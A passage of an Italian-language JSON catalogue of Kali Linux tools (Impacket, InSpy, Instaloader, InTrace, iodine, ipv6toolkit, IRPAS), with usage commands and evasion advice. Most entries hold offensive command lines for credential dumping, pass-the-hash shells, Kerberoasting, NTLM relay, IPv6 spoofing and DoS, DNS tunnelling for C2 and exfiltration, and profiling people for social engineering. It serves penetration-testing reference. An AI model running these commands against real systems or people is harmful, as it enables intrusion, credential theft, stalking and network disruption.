SMBExec\nimpacket-smbexec domain/admin:Password123@target \"whoami /all\"\n\n# NTLM Relay attack\nimpacket-ntlmrelayx -t ldaps://dc.domain.local --escalate-user lowpriv\n\n# Silver Ticket\nimpacket-ticketer -nthash HASH -domain-sid S-1-5-21-... -domain domain.local -spn HTTP/web admin</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Active Directory Penetration Testing</strong>, eseguire rapidamente operazioni comuni di attacco AD (lateral movement, credential dumping, Kerberos attacks) senza dover scrivere codice Python.</p><p>Per <strong>Quick Operations</strong>, lanciare comandi remoti, dump di credenziali o test specifici con una singola linea di comando durante un engagement.</p><p>Per <strong>Learning Impacket</strong>, approccio semplificato per imparare le funzionalità di Impacket prima di passare alla scrittura di script custom.</p><p>Per <strong>Automation &amp; Scripting</strong>, integrare operazioni Impacket in script bash e pipeline di automazione per penetration testing su larga scala.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> stesse considerazioni di Impacket - il traffico SMB/RPC è monitorato da EDR moderni. Ogni autenticazione genera Event ID 4624/4625. PSExec crea servizi temporanei (Event 7045). SecretsDump genera pattern specifici. Le signature degli script Impacket sono note ai vendor di sicurezza. Considerare tecniche di evasion per ambienti monitorati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Toolkits"
    ],
    "notes": null
  },
  {
    "id": "impacket",
    "name": "impacket",
    "version": "0.12.0",
    "icon": "../app/icons/impacket-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/impacket/",
    "desc": "Libreria Python per protocolli di rete Windows: SMB, MSRPC, NTLM, Kerberos, WMI.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Impacket</strong> è LA libreria Python per lavorare con protocolli di rete Windows. Include implementazioni complete di SMB, MSRPC, NTLM, Kerberos, WMI, LDAP e altri. Fornisce script pronti all'uso per attacchi AD comuni: secretsdump, psexec, wmiexec, GetNPUsers, GetUserSPNs e molti altri.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Protocol Suite:</strong> SMB1/2/3, MSRPC, Kerberos, NTLM.</p><p><strong>Ready Scripts:</strong> 50+ script per attacchi AD.</p><p><strong>Credential Attacks:</strong> Pass-the-hash, Kerberoasting, AS-REP roasting.</p><p><strong>Remote Execution:</strong> PSExec, WMIExec, SMBExec, AtExec.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Secretsdump con tutti i metodi (SAM, LSA, NTDS)\nimpacket-secretsdump -just-dc-ntlm domain/admin:password@dc.target.com -outputfile ntds_dump\n\n# DCSync attack per target specifico\nimpacket-secretsdump -just-dc-user krbtgt domain/admin@dc.target.com\n\n# Remote shell via diversi protocolli\nimpacket-psexec domain/admin@target -hashes aad3b:ntlmhash  # SMB\nimpacket-wmiexec domain/admin@target -hashes aad3b:ntlmhash # WMI (stealthier)\nimpacket-smbexec domain/admin@target -hashes aad3b:ntlmhash # SMB senza service\nimpacket-atexec domain/admin@target -hashes aad3b:ntlmhash \"whoami\" # Task Scheduler\n\n# Kerberoasting con output hashcat\nimpacket-GetUserSPNs domain/user:password -dc-ip 10.10.10.1 -request -outputfile kerberoast.txt\nhashcat -m 13100 kerberoast.txt wordlist.txt\n\n# Silver Ticket attack\nimpacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/sql.domain.local admin\n\n# NTLM relay su LDAP per addComputer\nimpacket-ntlmrelayx -t ldaps://dc.domain.local --add-computer EVIL$ Password123\n\n# Zerologon check e exploit\nimpacket-zerologon dc01 domain.local</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD Pentesting</strong>, toolkit essenziale per attacchi.</p><p>Nel <strong>Red Team</strong>, lateral movement e privilege escalation.</p><p><strong>Credential Harvesting</strong> e persistence.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Molto Rilevabile:</strong> Traffico SMB/RPC monitoato da EDR. Event 4624/4625 per login. Secretsdump genera eventi specifici. Signatrue degli script note.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Toolkits"
    ],
    "notes": null
  },
  {
    "id": "inspy",
    "name": "inspy",
    "version": "3.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/inspy/",
    "desc": "OSINT LinkedIn per enumerare dipendenti, ruoli e tecnologie usate da un'azienda.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>InSpy</strong> è un tool OSINT per enumerazione LinkedIn. Cerca dipendenti di un'azienda target, i loro ruoli, e le tecnologie menzionate nei profili. Utile per costruire liste di username, identificare target per social engineering, e mappare stack tecnologici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Employee Enum:</strong> Lista dipendenti da LinkedIn.</p><p><strong>Role Discovery:</strong> Identifica posizioni e dipartimenti.</p><p><strong>Tech Stack:</strong> Tecnologie da job posting e profili.</p><p><strong>Username Generation:</strong> Genera possibili username.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumera dipendenti\ninspy --empspy --company \"Target Corp\"\n\n# Cerca tecnologie\ninspy --techspy --company \"Target Corp\"\n\n# Output file\ninspy --empspy --company \"Target\" --output employees.txt\n\n# Con wordlist custom per tech\ninspy --techspy --company \"Target\" --wordlist tech.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, mappa struttura aziendale.</p><p>Nel <strong>Social Engineering</strong>, identifica target.</p><p><strong>Username Enum</strong> per attacchi successivi.</p><p><strong>Tech Recon</strong> per attack surface.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passivo:</strong> Scraping LinkedIn (possibile ban account). Non contatta il target direttamente. Rate limiting necessario per evitare blocchi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "People_Search"
    ],
    "notes": null
  },
  {
    "id": "instaloader",
    "name": "instaloader",
    "version": "4.14.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/instaloader/",
    "desc": "Scarica foto, video, storie e metadati da profili Instagram per OSINT social.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Instaloader</strong> è lo strumento Python di riferimento per il download automatizzato di contenuti da Instagram, progettato specificamente per operazioni OSINT e preservazione delle prove digitali. A differenza di semplici downloader, Instaloader estrae non solo media (foto, video, storie, reels, IGTV, highlights) ma anche tutti i metadati associati: caption, timestamp, geolocalizzazione, hashtag, menzioni, commenti e informazioni sui follower. Supporta sia profili pubblici che privati (con autenticazione), mantenendo la struttura originale dei dati per analisi forensi. Il tool gestisce automaticamente il rate limiting di Instagram, riprende download interrotti e può monitorare profili per nuovi contenuti nel tempo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Complete Content Extraction:</strong> Scarica tutti i tipi di contenuto Instagram: post del feed (foto singole, carousel, video), storie (incluse quelle in evidenza/highlights), reels, IGTV, tagged posts e saved posts. Per ogni elemento preserva la massima risoluzione disponibile e tutti i metadati associati in formato JSON strutturato per analisi successiva.</p><p><strong>Metadata Intelligence:</strong> Estrae informazioni critiche per OSINT: geotag con coordinate GPS, timestamp esatti di pubblicazione, lista completa di hashtag e menzioni, conteggio like e commenti, caption originali con eventuali modifiche. Permette di ricostruire timeline di attività, pattern di comportamento e network di contatti del target.</p><p><strong>Authentication & Private Access:</strong> Supporta login con credenziali Instagram per accedere a profili privati (se si è follower), storie, close friends content e propri saved posts. Gestisce sessioni persistenti, two-factor authentication e può usare session file per evitare login ripetuti che potrebbero triggerare security alert.</p><p><strong>Advanced Filtering & Automation:</strong> Filtra contenuti per data, tipo, hashtag o caption con espressioni regolari. Monitora profili per nuovi post con modalità daemon. Supporta download batch di liste di profili, hashtag o location. Resume automatico di download interrotti con state file persistente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Download completo profilo pubblico (post, highlights, tagged)\ninstaloader profile targetuser --highlights --tagged\n\n# Con login per profili privati o storie\ninstaloader --login yourusername profile targetuser --stories\n\n# Session file per evitare login ripetuti\ninstaloader --login yourusername --sessionfile ~/.instaloader-session\n\n# Download con tutti i metadati JSON\ninstaloader --metadata-json --comments profile targetuser\n\n# Solo post in un range di date\ninstaloader profile targetuser --post-filter \"date_utc >= datetime(2024,1,1)\"\n\n# Hashtag con geotag\ninstaloader \"#targetcity\" --geotags\n\n# Location ID (da URL Instagram)\ninstaloader %location_id\n\n# Batch download da file\ninstaloader -f userlist.txt --fast-update\n\n# Monitoring continuo\ninstaloader profile targetuser --fast-update --quiet &</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT Investigation</strong>, Instaloader è fondamentale per raccogliere informazioni complete su target: pattern di vita (quando posta, da dove, con chi), rete di contatti (follower, following, tagged), interessi (hashtag usati, account seguiti). I metadati GPS nelle foto possono rivelare indirizzi di casa/lavoro, luoghi frequentati regolarmente, e viaggi.</p><p>Nella <strong>Digital Evidence Preservation</strong>, permette di salvare contenuti prima che vengano eliminati dal target. Utile in casi legali, investigazioni HR, o monitoraggio di attività sospette. I metadati JSON forniscono chain of custody per prove digitali con timestamp verificabili.</p><p>Per <strong>Social Engineering Preparation</strong>, i contenuti scaricati aiutano a costruire pretesti credibili: hobby del target, luoghi frequentati, amici stretti, eventi recenti. Le foto possono essere analizzate per dettagli come badge aziendali, layout uffici, o informazioni sui sistemi usati.</p><p>Nel <strong>Brand Monitoring & Competitive Intelligence</strong>, monitora account competitor, influencer o brand mentions. Analizza trend di engagement, strategie di contenuto e timing di pubblicazione per benchmarking o threat intelligence su impersonation.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection Surface:</strong> Per profili pubblici senza login, l'attività è essenzialmente passiva (API calls anonime). Con login, Instagram traccia ogni sessione: IP, device fingerprint, pattern di accesso. Scraping aggressivo può triggerare CAPTCHA, temporary lock o permanent ban dell'account usato.</p><p><strong>Rate Limiting:</strong> Instagram implementa rate limiting aggressivo. Instaloader gestisce automaticamente i delay ma download massivi sono comunque rilevabili. Usare --request-timeout e --max-connection-attempts per evitare pattern sospetti. Considerare proxy rotation per operazioni estese.</p><p><strong>Account Security:</strong> Non usare account personali o facilmente riconducibili per login. Creare account dedicati con identità separate, possibilmente aged e con attività organica. Two-factor complica l'automazione ma aumenta la credibilità dell'account.</p><p><strong>Legal Considerations:</strong> Rispettare Terms of Service di Instagram e legislazione locale su privacy e data collection. In molte giurisdizioni, scraping di profili pubblici è legale ma l'uso dei dati potrebbe non esserlo. Documentare l'autorizzazione per penetration test.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Social_Media"
    ],
    "notes": null
  },
  {
    "id": "intrace",
    "name": "intrace",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/intrace/",
    "desc": "Traceroute che usa connessioni TCP esistenti per bypassare firewall statefull.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>InTrace</strong> è uno strumento avanzato di network enumeration che esegue traceroute sfruttando connessioni TCP già stabilite, bypassando così firewall stateful che normalmente bloccano traceroute tradizionale basato su ICMP o UDP. Il principio di funzionamento sfrutta il fatto che i firewall stateful, una volta che una connessione TCP è stabilita e tracciata nella connection table, permettono pacchetti appartenenti a quella sessione. InTrace inietta pacchetti con TTL incrementali nella connessione esistente, ricevendo ICMP Time Exceeded dai router intermedi esattamente come un traceroute normale, ma il traffico viene permesso perché associato a una connessione legittima. Questo permette di mappare l'infrastruttura di rete interna anche quando ICMP è completamente filtrato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TCP Session Hijacking per Traceroute:</strong> InTrace si aggancia a una connessione TCP esistente (identificata da source/dest IP e porte) e inietta pacchetti con TTL modificati. I pacchetti sembrano parte della sessione legittima al firewall, permettendo di attraversare regole che bloccherebbero ICMP Echo Request o UDP probes usati da traceroute tradizionale.</p><p><strong>Stateful Firewall Bypass:</strong> Sfrutta specificamente la logica dei firewall stateful che mantengono connection tracking. Una volta che la connessione TCP è nella state table come ESTABLISHED, i pacchetti InTrace vengono permessi automaticamente. Efficace contro firewall enterprise, UTM e next-gen firewall con ispezione layer 7.</p><p><strong>Passive Connection Detection:</strong> Monitora il traffico di rete per identificare connessioni TCP attive che possono essere utilizzate. Non richiede di stabilire nuove connessioni sospette - può usare sessioni già esistenti come browser web, SSH, o qualsiasi altro traffico TCP legittimo verso il target.</p><p><strong>Path Analysis Attraverso Segmentazione:</strong> Permette di mappare hop intermedi anche attraverso DMZ, VLAN e network segmentation. Rivela router, firewall e load balancer intermedi che non sarebbero visibili con scanning tradizionale. Utile per comprendere architettura di rete difesa in profondità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Step 1: Stabilire una connessione TCP legittima verso target\n# Terminale 1: mantieni connessione attiva\nnc -v target.com 80\nGET / HTTP/1.1\nHost: target.com\n\n# Step 2: Lanciare InTrace sulla connessione esistente\n# Terminale 2:\nsudo intrace -i eth0 -h target.com\n\n# Specificare porta se diversa da default\nsudo intrace -i eth0 -h target.com -p 443\n\n# Con source port specifica (match esatto della connessione)\nsudo intrace -i eth0 -h target.com -p 80 -s 54321\n\n# Aumentare max TTL per reti complesse\nsudo intrace -i eth0 -h target.com -m 40\n\n# Debug mode per troubleshooting\nsudo intrace -i eth0 -h target.com -d\n\n# Usando connessione SSH esistente\nssh user@target.com  # Terminale 1\nsudo intrace -i eth0 -h target.com -p 22  # Terminale 2</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Penetration Testing di Reti Enterprise</strong>, InTrace permette di mappare l'infrastruttura interna anche quando il perimetro blocca completamente ICMP. Durante un assessment, stabilisci una connessione legittima a un servizio esposto (web, email, VPN) e usa InTrace per rivelare router interni, firewall, load balancer e segmentazione di rete non documentata.</p><p>Per <strong>Red Team Infrastructure Mapping</strong>, dopo aver ottenuto accesso iniziale, InTrace aiuta a comprendere la topologia di rete senza generare traffico ICMP sospetto. Identifica chokepoint, firewall interni e percorsi di rete che possono essere sfruttati per lateral movement o per pianificare persistence.</p><p>Durante <strong>Firewall Rule Analysis</strong>, InTrace rivela quali hop sono visibili e quali no, aiutando a comprendere dove sono posizionati i firewall e come sono configurate le regole. La differenza tra traceroute tradizionale (bloccato) e InTrace (funzionante) conferma la presenza di stateful inspection.</p><p>Per <strong>Network Troubleshooting Avanzato</strong>, quando traceroute normale è bloccato ma hai connettività TCP, InTrace permette di diagnosticare problemi di routing, identificare dove i pacchetti vengono droppati e verificare percorsi attraverso infrastrutture complesse con policy firewall restrittive.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection Vectors:</strong> Sebbene più stealth di traceroute tradizionale, InTrace genera pacchetti con pattern TTL anomali (TTL molto bassi in pacchetti data) che sistemi IDS avanzati possono rilevare. I messaggi ICMP Time Exceeded di ritorno sono anche loggabili. Deep Packet Inspection potrebbe identificare l'anomalia.</p><p><strong>Connection Requirements:</strong> Richiede una connessione TCP esistente e stabile. La connessione deve rimanere attiva durante tutto il trace. Se la connessione termina o va in timeout, InTrace fallisce. Preferire connessioni persistenti (SSH, HTTP keep-alive) rispetto a request singole.</p><p><strong>Privilege Requirements:</strong> Richiede privilegi root/administrator per raw socket e packet injection. L'esecuzione con sudo può essere loggata. In ambienti containerizzati potrebbero essere necessarie capabilities specifiche.</p><p><strong>Traffic Anomalies:</strong> I pacchetti iniettati hanno numeri di sequenza che potrebbero non allinearsi perfettamente con il flusso TCP reale. Stack TCP moderni e IDS stateful potrebbero rilevare questa inconsistenza come potenziale session hijacking attempt.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "iodine",
    "name": "iodine",
    "version": "0.7.0",
    "icon": "../app/icons/iodine-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/iodine/",
    "desc": "Tunnel IP over DNS per bypassare captive portal e firewall che permettono query DNS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Iodine</strong> è lo strumento di riferimento per creare tunnel IP-over-DNS, permettendo di bypassare captive portal, firewall restrittivi e reti che bloccano tutto il traffico eccetto le query DNS. Il principio di funzionamento sfrutta il fatto che quasi tutte le reti permettono query DNS (porta UDP 53) per la risoluzione dei nomi: Iodine incapsula pacchetti IP completi all'interno di query e risposte DNS, creando un tunnel trasparente che può trasportare qualsiasi traffico TCP/UDP. Il sistema richiede un server Iodine su un host con IP pubblico e un dominio con record NS che punta a quel server. Il client invia query DNS per sottodomini del tipo 'encoded-data.tunnel.yourdomain.com', il server DNS autoritativo (iodined) decodifica i dati e risponde con altri dati encoded nelle risposte. Raggiunge throughput di 500+ Kbps con bassa latenza su connessioni buone.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Full IP Tunnel over DNS:</strong> A differenza di altri tool che tunnelano solo specifici protocolli, Iodine crea un'interfaccia TUN completa che può trasportare qualsiasi traffico IP. Una volta stabilito il tunnel, puoi routare tutto il traffico internet attraverso di esso, inclusi TCP, UDP, ICMP. Supporta MTU configurabile fino a 1200 byte per ottimizzare il throughput.</p><p><strong>Multiple Encoding Schemes:</strong> Supporta diversi encoding per i dati nelle query DNS: Base32 (compatibile ovunque), Base64 (più efficiente ma alcuni DNS proxy non lo supportano), Base64url, Base128. L'auto-probing all'avvio testa automaticamente quale encoding funziona meglio attraverso la specifica rete e sceglie quello ottimale per massimizzare throughput.</p><p><strong>DNS Proxy Bypass:</strong> Molte reti forzano le query DNS attraverso proxy che modificano o filtrano le risposte. Iodine può usare query NULL, PRIVATE, TXT, SRV, MX, CNAME, o A per trovare quale tipo passa attraverso i proxy senza essere modificato. Supporta anche modalità raw per connessioni UDP dirette quando il DNS locale è raggiungibile.</p><p><strong>Authentication e Compression:</strong> Password-based authentication tra client e server per prevenire uso non autorizzato. Compressione LZO opzionale per aumentare il throughput effettivo. Supporta multiple client simultanei sullo stesso server con subnet configurabile.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP SERVER (VPS con IP pubblico) ===\n# Prerequisito: dominio con record NS che punta al VPS\n# tunnel.yourdomain.com NS -> vps.yourdomain.com\n# vps.yourdomain.com A -> IP_DEL_VPS\n\n# Avvia server (10.0.0.1 sarà l'IP del server nel tunnel)\nsudo iodined -f -c -P secretpassword 10.0.0.1/24 tunnel.yourdomain.com\n\n# Con opzioni avanzate\nsudo iodined -f -c -P password -n auto -l 0.0.0.0 -p 53 10.0.0.1/24 tunnel.yourdomain.com\n\n# === CLIENT ===\n# Connessione base\nsudo iodine -f -P secretpassword tunnel.yourdomain.com\n\n# Specificando DNS server (se DNS locale non funziona)\nsudo iodine -f -P password 8.8.8.8 tunnel.yourdomain.com\n\n# Forzare encoding specifico\nsudo iodine -f -P password -T TXT tunnel.yourdomain.com\n\n# === POST-CONNESSIONE ===\n# Verifica tunnel\nping 10.0.0.1\n\n# SSH attraverso tunnel\nssh user@10.0.0.1\n\n# Route tutto il traffico attraverso tunnel\nsudo ip route add default via 10.0.0.1 dev dns0\n\n# SOCKS proxy via SSH attraverso tunnel\nssh -D 1080 user@10.0.0.1\ncurl --socks5 127.0.0.1:1080 https://ifconfig.me</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Captive Portal Bypass</strong>, in aeroporti, hotel, conferenze e reti WiFi pubbliche che richiedono login o pagamento. Prima del login, il DNS di solito funziona già (per mostrare la pagina di login). Iodine sfrutta questo per creare un tunnel completo bypassando il captive portal. Utile per accesso internet gratuito o per privacy quando non ti fidi della rete.</p><p>Nelle <strong>Red Team Operations</strong>, Iodine è fondamentale per C2 covert communications quando le reti target hanno egress filtering aggressivo. Quasi nessuna rete blocca DNS completamente. Il tunnel può essere usato per exfiltration di dati, reverse shells, o come transport per altri tool. Combina con SSH per crittografia aggiuntiva.</p><p>Per <strong>Firewall Bypass in Ambienti Restrittivi</strong>, reti corporate, guest network, o ambienti regolamentati spesso permettono solo protocolli specifici. Se DNS passa (e quasi sempre passa), Iodine può tunnelare qualsiasi traffico. Utile per accedere a risorse bloccate o per testare l'efficacia delle policy di egress filtering durante assessment.</p><p>Come <strong>Backup Internet Access</strong>, quando viaggi o in situazioni dove la connettività è limitata, avere un server Iodine preconfigurato garantisce un metodo di fallback per accesso internet. La velocità è limitata (pochi hundred Kbps) ma sufficiente per SSH, email, e browsing basilare.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Traffic Pattern Analysis:</strong> Il traffico Iodine è altamente distinguibile: alto volume di query DNS per sottodomini lunghi con pattern encoded evidenti, dimensioni delle risposte inusuali, e frequenza di query anomala. Qualsiasi monitoraggio DNS sofisticato può identificarlo. Soluzioni EDR e SIEM moderne hanno signature per DNS tunneling.</p><p><strong>Domain Reputation:</strong> Il dominio usato per il tunnel potrebbe essere flaggato e aggiunto a blocklist. Usare domini fresh e non associati all'attività principale. Considerare domini che sembrano legittime CDN o servizi cloud per ridurre sospetti.</p><p><strong>Throughput e Latenza:</strong> Iodine è lento rispetto a VPN tradizionali (tipicamente 100-500 Kbps). La latenza aggiunge round-trip per ogni query DNS. Non adatto per streaming o trasferimenti grandi. Ottimo per shell interattive e piccoli trasferimenti.</p><p><strong>Alternative Detection:</strong> Se DNS over HTTPS (DoH) o DNS over TLS (DoT) sono disponibili, potrebbero essere alternative meno rilevabili. Alcuni ambienti corporate ispezionano anche il DNS - in quel caso Iodine non funzionerà o sarà immediatamente rilevato.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "ipv6toolkit",
    "name": "ipv6toolkit",
    "version": "2.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ipv6toolkit/",
    "desc": "Suite di tool per security assessment di reti IPv6: scanning, spoofing, MITM.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>IPv6 Toolkit è la suite di sicurezza più completa per assessment e testing di reti IPv6, sviluppata da Fernando Gont. Include oltre 20 tool specializzati che coprono ogni aspetto della sicurezza IPv6: scanning e reconnaissance, attacchi al Neighbor Discovery Protocol (NDP), Router Advertisement spoofing, fragmentation attacks, e evasion di security devices. La rilevanza di questa suite è critica perché la maggior parte delle reti moderne ha IPv6 abilitato di default (spesso senza che gli amministratori ne siano consapevoli), ma i controlli di sicurezza sono quasi esclusivamente focalizzati su IPv4. Questo crea una superficie d'attacco significativa che IPv6 Toolkit permette di esplorare e testare sistematicamente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Comprehensive IPv6 Scanning (scan6):</strong> Lo scanner più avanzato per IPv6, supporta multiple tecniche di discovery: ICMPv6 echo, TCP SYN, UDP probes. Può enumerare host locali usando NDP, fare scanning di interi prefissi /64 usando tecniche intelligenti (non è possibile fare brute-force di 2^64 indirizzi). Identifica sistemi operativi basandosi su implementation-specific behaviors di IPv6.</p><p><strong>Router Advertisement Attacks (ra6):</strong> Permette di iniettare Router Advertisement malevoli per diventare default gateway della rete, modificare la configurazione DNS dei client (RDNSS), o causare DoS disabilitando la connettività IPv6. Questi attacchi sono particolarmente efficaci perché IPv6 si auto-configura e i client accettano RA da qualsiasi router.</p><p><strong>Neighbor Discovery Manipulation (na6, ns6, ni6):</strong> Suite completa per attacchi al protocollo NDP (equivalente IPv6 di ARP). Permette neighbor cache poisoning per MITM, DoS tramite duplicate address detection attacks, e reconnaissance tramite Node Information queries. Include tool per generare risposte NA spoofate e NS flood.</p><p><strong>Fragmentation Evasion (frag6):</strong> Sfrutta la frammentazione IPv6 per evadere IDS/IPS e firewall. A differenza di IPv4, in IPv6 solo l'host sorgente può frammentare, e molti security device non riassemblano correttamente. Permette di testare la resilienza dei controlli di sicurezza a overlapping fragments e tiny fragments.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SCANNING ===\n# Scan rete locale via NDP (veloce e completo)\nscan6 -i eth0 -L -e\n\n# Scan prefisso remoto con tecniche intelligenti\nscan6 -i eth0 -d 2001:db8::/64 --tgt-virtual-machines all\n\n# Scan porte TCP su target IPv6\nscan6 -i eth0 -d 2001:db8::1 -p 22,80,443,8080\n\n# Scan con evasion (source address spoofing)\nscan6 -i eth0 -d target -s 2001:db8::dead:beef\n\n# === ROUTER ADVERTISEMENT ATTACKS ===\n# Diventare default router (MITM)\nra6 -i eth0 -A 2001:db8::/64 -L 9000 -R 9000\n\n# RA flood per DoS\nra6 -i eth0 -F --flood-routers 100\n\n# Iniettare DNS server malevolo via RDNSS\nra6 -i eth0 -A 2001:db8::/64 -N 2001:db8::53\n\n# === NEIGHBOR DISCOVERY ATTACKS ===\n# Neighbor Advertisement spoofing (cache poisoning)\nna6 -i eth0 -T 2001:db8::target -E attacker_mac\n\n# NS flood per DoS\nns6 -i eth0 -d 2001:db8::victim -F\n\n# DAD attack (impedire configurazione IP)\nna6 -i eth0 -L -E -W victimsolicited\n\n# === FRAGMENTATION EVASION ===\n# Test IDS bypass con overlapping fragments\nfrag6 -i eth0 -d target -u -p 80 --frag-otype overlap\n\n# Atomic fragments (0 byte payload fragments)\nfrag6 -i eth0 -d target -A\n\n# === ALTRI TOOL ===\n# Path MTU Discovery manipulation\npmtudisc6 -i eth0 -d target\n\n# ICMPv6 redirect attacks\nrd6 -i eth0 -d victim -r malicious_router</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>IPv6 Security Assessment</strong>, la maggior parte delle organizzazioni non ha mai testato la propria postura di sicurezza IPv6. IPv6 Toolkit permette di verificare se i sistemi sono vulnerabili a RA spoofing (spesso lo sono), se i firewall filtrano correttamente il traffico IPv6, e se IDS/IPS rilevano attacchi IPv6. È comune trovare reti dove IPv4 è ben protetto ma IPv6 è completamente aperto.</p><p>Durante <strong>Penetration Testing su Reti Dual-Stack</strong>, quando i controlli IPv4 sono solidi, IPv6 Toolkit permette di cercare vie alternative. Attacchi RA possono dare accesso come default gateway senza che i sistemi di sicurezza IPv4-focused lo rilevino. Neighbor cache poisoning funziona spesso anche quando ARP spoofing è mitigato.</p><p>Per <strong>Red Team Operations</strong>, IPv6 rappresenta un canale spesso non monitorato per command and control, lateral movement e data exfiltration. Molte organizzazioni non hanno logging IPv6, non ispezionano traffico IPv6, e non hanno regole firewall IPv6. IPv6 Toolkit aiuta a verificare e sfruttare questi gap.</p><p>Nel <strong>Security Research e IDS Testing</strong>, la fragmentation evasion capabilities permette di testare se i security device riassemblano correttamente i frammenti IPv6. Molti IDS/IPS falliscono su overlapping fragments, tiny fragments, e altre tecniche che IPv6 Toolkit può generare sistematicamente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>High Visibility Attacks:</strong> Molti attacchi IPv6 sono intrinsecamente rumorosi. RA spoofing affecta tutti gli host del segmento e può causare instabilità di rete. Neighbor cache poisoning genera traffico anomalo facilmente rilevabile da chi monitora. Alcuni attacchi (RA flood) possono causare DoS involontario.</p><p><strong>Network Disruption Risk:</strong> A differenza di IPv4 dove gli attacchi sono più localizzati, molti attacchi IPv6 hanno impatto broadcast. Un RA malevolo può rompere la connettività di tutti gli host. Testare sempre in ambienti controllati prima di usare in produzione.</p><p><strong>Emerging Monitoring:</strong> Sebbene molte reti non monitorino IPv6, le organizzazioni mature stanno implementando controlli. RA Guard sui switch enterprise mitiga RA spoofing. SEND (Secure Neighbor Discovery) è raro ma esiste. EDR moderni iniziano a monitorare traffico IPv6 anomalo.</p><p><strong>Privilege Requirements:</strong> La maggior parte dei tool richiede raw socket access (root). L'attività sarà loggata nei system log. In ambienti containerizzati potrebbero essere necessarie capabilities specifiche (CAP_NET_RAW, CAP_NET_ADMIN).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "irpas",
    "name": "irpas",
    "version": "0.10",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/irpas/",
    "desc": "Suite per attacchi su protocolli di routing: CDP, HSRP, IGRP, IRDP spoofing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>IRPAS</strong> (Internet Routing Protocol Attack Suite) è una collezione storica ma ancora rilevante di tool per attacchi su protocolli di routing e discovery di infrastruttura di rete. La suite sfrutta debolezze intrinseche in protocolli progettati per ambienti trusted: CDP (Cisco Discovery Protocol), HSRP (Hot Standby Router Protocol), IGRP (Interior Gateway Routing Protocol), e IRDP (ICMP Router Discovery Protocol). Questi protocolli spesso mancano di autenticazione o usano autenticazione debole, permettendo a un attaccante sulla stessa rete di manipolare routing, diventare gateway, o causare denial of service. Gli attacchi IRPAS operano a Layer 2/3 e possono dare accesso a tutto il traffico di rete, rappresentando una delle forme più potenti di MITM in ambienti enterprise.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>CDP Spoofing e Flooding (cdp):</strong> Cisco Discovery Protocol è usato da device Cisco per annunciare la propria presenza. IRPAS può iniettare CDP packets 